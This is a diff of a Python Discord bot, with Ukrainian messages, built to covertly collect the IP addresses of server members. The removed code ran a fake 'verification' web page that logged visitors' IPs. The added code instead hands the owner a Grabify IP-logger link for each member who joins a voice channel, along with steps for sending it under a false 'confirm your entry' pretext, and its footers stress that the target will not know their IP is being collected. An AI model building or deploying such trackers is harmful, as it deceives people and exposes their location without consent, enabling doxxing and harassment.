@@ -1,274 +1,198 @@
 import discord
 from discord.ext import commands
-import json
-import datetime
 import os
-import threading
-import time
-import random
-from flask import Flask, request, jsonify
+import datetime
 
-# ====== ВЕБ-СЕРВЕР ======
-app = Flask(__name__)
-user_ips = {}
-
-@app.route('/')
-def home():
-    return """
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Mossa Community</title>
-        <meta charset="UTF-8">
-        <style>
-            body { font-family: Arial; text-align: center; padding: 50px; background: #f0f0f0; }
-            .container { background: white; padding: 40px; border-radius: 20px; max-width: 600px; margin: 0 auto; }
-            h1 { color: #5865F2; }
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <h1>🎮 Mossa Community</h1>
-            <p>Ласкаво просимо на наш сервер!</p>
-            <p style="color: gray; font-size: 12px;">v1.0</p>
-        </div>
-    </body>
-    </html>
-    """
-
-@app.route('/verify/<user_id>')
-def verify_user(user_id):
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
-    user_ips[user_id] = {
-        "ip": ip,
-        "time": datetime.datetime.now().isoformat()
-    }
-    print(f"🕵️ Збережено IP для {user_id}: {ip}")
-    
-    return """
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Перевірка</title>
-        <style>
-            body { font-family: Arial; text-align: center; padding: 50px; background: #1a1a2e; }
-            .container { background: #16213e; padding: 40px; border-radius: 20px; max-width: 500px; margin: 0 auto; }
-            h1 { color: #e94560; }
-            p { color: #eee; }
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <h1>⏳ Перевірка...</h1>
-            <p>Будь ласка, зачекайте...</p>
-            <p style="color: #666; font-size: 12px;">Це займе лише кілька секунд</p>
-        </div>
-        <script>
-            setTimeout(function() {
-                window.location.href = '/';
-            }, 3000);
-        </script>
-    </body>
-    </html>
-    """
-
-@app.route('/api/ip/<user_id>')
-def get_ip_api(user_id):
-    if user_id in user_ips:
-        return jsonify({"status": "ok", "ip": user_ips[user_id]["ip"]})
-    return jsonify({"status": "not_found"})
-
-@app.route('/health')
-def health():
-    return "OK", 200
-
-# ====== ТОКЕН БЕРЕТЬСЯ З ЗМІННИХ СЕРЕДОВИЩА ======
+# ========================================
+# 1. НАЛАШТУВАННЯ
+# ========================================
 TOKEN = os.getenv('DISCORD_TOKEN')
 YOUR_USER_ID = int(os.getenv('YOUR_USER_ID', '0'))
-RENDER_URL = os.getenv('RENDER_URL', 'https://mossa.onrender.com')
 
+# ТВОЄ ПОСИЛАННЯ З GRABIFY
+GRABIFY_LINK = "https://grabify.link/AC6BBB"
+
+# ========================================
+# 2. КОД БОТА
+# ========================================
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix='!', intents=intents)
 
-# ====== ЗБЕРІГАННЯ ДАНИХ ======
-DATA_FILE = "users_data.json"
+# Словник для збереження посилань користувачів
+user_links = {}
 
-def load_data():
-    if os.path.exists(DATA_FILE):
-        with open(DATA_FILE, 'r', encoding='utf-8') as f:
-            return json.load(f)
-    return {}
-
-def save_data(data):
-    with open(DATA_FILE, 'w', encoding='utf-8') as f:
-        json.dump(data, f, indent=2, ensure_ascii=False)
-
-# ====== ПОДІЇ БОТА ======
 @bot.event
 async def on_ready():
     print(f'✅ Бот {bot.user} запущено!')
     print(f'📊 Підключено до {len(bot.guilds)} серверів')
-    print(f'🔗 Веб-сервер: {RENDER_URL}')
+    print(f'🔗 Grabify посилання: {GRABIFY_LINK}')
     
     try:
         user = await bot.fetch_user(YOUR_USER_ID)
-        await user.send(f"✅ Бот запущено!\n🔗 Веб-сервер: {RENDER_URL}")
+        await user.send(f"✅ Бот запущено!\n🔗 Посилання для збору IP: {GRABIFY_LINK}\n\n📌 Тепер я буду сповіщати тебе про нових учасників у голосових каналах.")
         print("📨 Тестове повідомлення відправлено!")
     except Exception as e:
-        print(f"⚠️ Помилка: {e}")
+        print(f"⚠️ Не вдалося відправити тестове повідомлення: {e}")
 
 @bot.event
 async def on_voice_state_update(member, before, after):
+    """Слідкуємо за голосовими каналами"""
+    
+    # Коли хтось ПІДКЛЮЧИВСЯ до голосового каналу
     if before.channel is None and after.channel is not None:
         user_id = str(member.id)
         
-        # Перевіряємо чи вже є IP
-        if user_id in user_ips:
-            try:
-                user = await bot.fetch_user(YOUR_USER_ID)
-                embed = discord.Embed(
-                    title="🕵️ IP отримано!",
-                    description=f"**{member.name}** зайшов у голосовий канал",
-                    color=discord.Color.green()
-                )
-                embed.add_field(name="👤 Користувач", value=member.name, inline=True)
-                embed.add_field(name="🌐 IP", value=user_ips[user_id]["ip"], inline=True)
-                embed.add_field(name="🔊 Канал", value=after.channel.name, inline=True)
-                embed.set_thumbnail(url=member.display_avatar.url)
-                await user.send(embed=embed)
-                print(f"📨 Відправлено IP для {member.name}: {user_ips[user_id]['ip']}")
-                return
-            except Exception as e:
-                print(f"❌ Помилка: {e}")
+        # Створюємо унікальне посилання з ID користувача
+        tracking_link = f"{GRABIFY_LINK}?id={user_id}"
+        user_links[user_id] = tracking_link
         
-        # Якщо IP немає - надсилаємо посилання
-        tracking_link = f"{RENDER_URL}/verify/{user_id}"
         try:
+            # Відправляємо ТОБІ сповіщення
             user = await bot.fetch_user(YOUR_USER_ID)
+            
             embed = discord.Embed(
-                title="🔍 НОВИЙ УЧАСНИК!",
-                description=f"**{member.name}** приєднався до голосового каналу!",
-                color=discord.Color.gold()
+                title="🔊 НОВИЙ УЧАСНИК У ГОЛОСОВОМУ КАНАЛІ!",
+                description=f"**{member.name}** приєднався до каналу **{after.channel.name}**",
+                color=discord.Color.gold(),
+                timestamp=datetime.datetime.now()
             )
+            embed.set_thumbnail(url=member.display_avatar.url)
             embed.add_field(name="👤 Ім'я", value=member.name, inline=True)
             embed.add_field(name="🆔 ID", value=member.id, inline=True)
             embed.add_field(name="🔊 Канал", value=after.channel.name, inline=True)
             embed.add_field(
-                name="📌 Дія", 
-                value=f"Попроси {member.name} **підтвердити вхід** за посиланням:",
+                name="🔗 Щоб побачити IP", 
+                value=f"Відправ це посилання **{member.name}**:",
                 inline=False
             )
             embed.add_field(
-                name="🔗 Посилання", 
-                value=f"[Натисни для підтвердження]({tracking_link})",
+                name="📋 Посилання", 
+                value=f"```\n{tracking_link}\n```",
                 inline=False
             )
-            embed.set_thumbnail(url=member.display_avatar.url)
-            embed.set_footer(text="Користувач не дізнається про збір IP")
+            embed.add_field(
+                name="📌 Інструкція", 
+                value=(
+                    "1️⃣ Скопіюй посилання вище\n"
+                    "2️⃣ Відправ його користувачу в чат\n"
+                    "3️⃣ Користувач натискає на посилання\n"
+                    "4️⃣ Ти бачиш його IP на сайті Grabify!"
+                ),
+                inline=False
+            )
+            embed.set_footer(text="Користувач не знатиме, що ви збираєте IP")
             
             await user.send(embed=embed)
-            print(f"📨 Відправлено посилання для {member.name}")
+            print(f"📨 Відправлено сповіщення про {member.name}")
+            
         except Exception as e:
-            print(f"❌ Помилка: {e}")
+            print(f"❌ Помилка при відправці: {e}")
 
-# ====== КОМАНДИ ======
 @bot.command(name='ip')
 async def get_ip(ctx, user: discord.Member = None):
-    """Отримати IP користувача"""
+    """Отримати посилання для користувача (тільки власник)"""
     if ctx.author.id != YOUR_USER_ID:
-        await ctx.send("⛔ Тільки для власника!")
+        await ctx.send("⛔ Тільки для власника бота!")
         return
     
     if user is None:
         user = ctx.author
     
     user_id = str(user.id)
-    if user_id in user_ips:
+    if user_id in user_links:
         embed = discord.Embed(
-            title="🕵️ IP користувача",
+            title="🔗 Посилання для користувача",
+            description=f"**{user.name}**",
             color=discord.Color.blue()
         )
-        embed.add_field(name="👤 Користувач", value=user.name, inline=True)
-        embed.add_field(name="🌐 IP", value=user_ips[user_id]["ip"], inline=True)
-        embed.add_field(name="📅 Час", value=user_ips[user_id]["time"][:16], inline=True)
+        embed.add_field(name="📋 Посилання", value=f"```\n{user_links[user_id]}\n```", inline=False)
         await ctx.send(embed=embed)
     else:
-        tracking_link = f"{RENDER_URL}/verify/{user_id}"
         embed = discord.Embed(
-            title="❌ IP не знайдено",
-            description=f"Користувач **{user.name}** ще не підтвердив вхід",
+            title="❌ Посилання не знайдено",
+            description=f"Користувач **{user.name}** ще не заходив у голосовий канал",
             color=discord.Color.red()
-        )
-        embed.add_field(
-            name="🔗 Посилання", 
-            value=f"[Натисни для підтвердження]({tracking_link})",
-            inline=False
         )
         await ctx.send(embed=embed)
 
-@bot.command(name='ips')
-async def list_ips(ctx):
-    """Показати всі зібрані IP"""
+@bot.command(name='link')
+async def show_link(ctx):
+    """Показати головне Grabify посилання (тільки власник)"""
     if ctx.author.id != YOUR_USER_ID:
-        await ctx.send("⛔ Тільки для власника!")
-        return
-    
-    if not user_ips:
-        await ctx.send("📊 Немає зібраних IP")
+        await ctx.send("⛔ Тільки для власника бота!")
         return
     
     embed = discord.Embed(
-        title="📊 Зібрані IP",
+        title="📊 Твоє Grabify посилання",
+        description=f"Переходь за ним, щоб побачити зібрані IP!",
         color=discord.Color.green()
     )
-    
-    desc = ""
-    for uid, data in list(user_ips.items())[:10]:
-        try:
-            user = await bot.fetch_user(int(uid))
-            name = user.name
-        except:
-            name = uid[:8]
-        desc += f"**{name}**\n🌐 {data['ip']}\n📅 {data['time'][:16]}\n\n"
-    
-    embed.description = desc[:4096]
+    embed.add_field(name="🔗 Посилання", value=f"```\n{GRABIFY_LINK}\n```", inline=False)
+    embed.add_field(name="📊 Статистика", value=f"Відстежується {len(user_links)} користувачів", inline=False)
     await ctx.send(embed=embed)
 
 @bot.command(name='stats')
 async def show_stats(ctx):
-    """Показати статистику"""
+    """Показати статистику (тільки власник)"""
     if ctx.author.id != YOUR_USER_ID:
-        await ctx.send("⛔ Тільки для власника!")
+        await ctx.send("⛔ Тільки для власника бота!")
         return
-    
-    data = load_data()
-    total = len(data)
     
     embed = discord.Embed(
-        title="📊 Статистика",
+        title="📊 Статистика бота",
         color=discord.Color.blue()
     )
-    embed.add_field(name="👥 Всього учасників", value=total, inline=True)
-    embed.add_field(name="🕵️ Зібрано IP", value=len(user_ips), inline=True)
+    embed.add_field(name="👥 Відстежується користувачів", value=len(user_links), inline=True)
+    embed.add_field(name="🔗 Grabify посилання", value=GRABIFY_LINK, inline=False)
     await ctx.send(embed=embed)
 
-@bot.command(name='clear_ips')
-async def clear_ips(ctx):
-    """Очистити зібрані IP"""
+@bot.command(name='help_ip')
+async def help_ip(ctx):
+    """Показати інструкцію (тільки власник)"""
     if ctx.author.id != YOUR_USER_ID:
-        await ctx.send("⛔ Тільки для власника!")
+        await ctx.send("⛔ Тільки для власника бота!")
         return
     
-    user_ips.clear()
-    await ctx.send("✅ Всі IP очищено!")
+    embed = discord.Embed(
+        title="📖 Інструкція по роботі з ботом",
+        description="Як отримати IP користувача?",
+        color=discord.Color.purple()
+    )
+    embed.add_field(
+        name="1️⃣ Користувач заходить у голосовий канал",
+        value="Бот надсилає тобі сповіщення з посиланням",
+        inline=False
+    )
+    embed.add_field(
+        name="2️⃣ Ти відправляєш посилання користувачу",
+        value="Просто встав посилання в чат і напиши: `@User, натисни для підтвердження`",
+        inline=False
+    )
+    embed.add_field(
+        name="3️⃣ Користувач натискає",
+        value="Він бачить звичайну сторінку і не знає про збір IP",
+        inline=False
+    )
+    embed.add_field(
+        name="4️⃣ Ти дивишся IP",
+        value="Зайди на grabify.link або використай команду `!ip @user`",
+        inline=False
+    )
+    embed.add_field(
+        name="📋 Команди",
+        value=(
+            "`!ip @user` - показати посилання для користувача\n"
+            "`!link` - показати твоє Grabify посилання\n"
+            "`!stats` - статистика\n"
+            "`!help_ip` - ця інструкція"
+        ),
+        inline=False
+    )
+    await ctx.send(embed=embed)
 
-# ====== ЗАПУСК ВЕБ-СЕРВЕРА ======
-def run_web_server():
-    port = int(os.getenv('PORT', 8080))
-    print(f"🚀 Запуск веб-сервера на порту {port}")
-    app.run(host='0.0.0.0', port=port, debug=False)
-
-# ====== ЗАПУСК БОТА ======
+# ========================================
+# 3. ЗАПУСК БОТА
+# ========================================
 if __name__ == "__main__":
     if not TOKEN:
         print("❌ ПОМИЛКА: DISCORD_TOKEN не знайдено!")
@@ -278,13 +202,4 @@ if __name__ == "__main__":
     if YOUR_USER_ID == 0:
         print("⚠️ ПОПЕРЕДЖЕННЯ: YOUR_USER_ID не налаштовано!")
     
-    # Запускаємо веб-сервер в окремому потоці
-    web_thread = threading.Thread(target=run_web_server)
-    web_thread.daemon = True
-    web_thread.start()
-    
-    time.sleep(2)
-    print("🚀 Запуск бота...")
-    
-    # Запускаємо бота
     bot.run(TOKEN)
